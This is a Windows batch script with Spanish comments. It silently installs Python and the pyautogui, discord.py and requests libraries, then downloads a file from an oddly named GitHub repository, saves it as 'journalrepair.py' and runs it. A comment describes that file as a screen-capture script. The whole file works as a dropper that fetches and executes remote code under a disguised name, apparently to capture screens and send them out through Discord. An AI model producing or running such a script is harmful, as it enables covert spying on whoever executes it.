@echo off
SETLOCAL

REM Comprueba si Python está instalado
where python >nul 2>nul
IF %ERRORLEVEL% NEQ 0 (
    echo Python no está instalado. Instalando Python...
    REM Descargar e instalar Python (asegúrate de que la URL de descarga sea correcta)
    powershell -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe -OutFile python-installer.exe"
    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python-installer.exe
)

REM Instalar pip si no está instalado
python -m ensurepip --default-pip

REM Instalar las librerías necesarias
python -m pip install --upgrade pip
pip install pyautogui discord.py requests

REM Descargar el script desde GitHub
REM Reemplaza <URL_del_repositorio> con la URL real de tu repositorio en GitHub
powershell -Command "Invoke-WebRequest -Uri https://github.com/retirandopelados9029/peneanlakxkd.git -OutFile journalrepair.py"

REM Ejecutar el script de captura de pantalla
start python journalrepair.py

echo Instalación completada.
ENDLOCAL
